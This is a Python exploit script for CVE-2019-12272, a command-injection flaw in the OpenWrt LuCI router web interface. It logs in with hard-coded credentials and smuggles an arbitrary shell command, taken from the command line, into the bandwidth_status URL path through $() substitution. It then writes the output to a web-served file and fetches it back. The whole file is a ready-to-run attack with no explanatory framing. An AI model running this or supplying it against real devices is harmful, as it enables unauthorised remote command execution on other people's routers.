import requests
from urllib.parse import urlparse
import sys

class CVE_2019_12272:
    def __init__(self, host = '192.168.56.22'):
        self.host = host
        self.stok = ''
        self.cmd = ''
        self.luci_username = 'root'
        self.luci_password = '123456789'
        self.sysauth = '24a291bfb814f167de7eeb086effd969'
        self.cookies = ''
        self.headers = {
            'Connection': 'keep-alive',
            'Pragma': 'no-cache',
            'Cache-Control': 'no-cache',
            'Upgrade-Insecure-Requests': '1',
            'Origin': self.host,
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Referer': 'http://192.168.56.22/cgi-bin/luci',
            'Accept-Language': 'en,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7',
        }
        
    def login(self):
        data = {
        'luci_username': self.luci_username,
        'luci_password': self.luci_password
        }
        url = 'http://{host}/cgi-bin/luci'.format(host = self.host)
        response = requests.post(url, headers=self.headers, data=data, verify=False, allow_redirects=False)
        self.cookies = response.cookies
        Location = response.headers['Location']
        self.stok = urlparse(Location).params

    def shell(self, cmd = 'ifconfig'):
        self.cmd = cmd + '%3ecmd.txt'
        url = 'http://{host}/cgi-bin/luci/;{stok}/admin/status/realtime/bandwidth_status/eth0$({cmd})'.format(host = self.host, cmd = self.cmd, stok = self.stok)
        headers = {
            'Connection': 'keep-alive',
            'Pragma': 'no-cache',
            'Cache-Control': 'no-cache',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'en,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7',
        }
        response = requests.get(url, headers=headers, cookies=self.cookies, verify=False)

    def view(self):
        url = 'http://{host}/cmd.txt'.format(host = self.host)
        response = requests.get(url, headers=self.headers)
        print(response.text)

if __name__ == '__main__':
    test = CVE_2019_12272()
    test.login()
    test.shell(sys.argv[1])
    test.view()
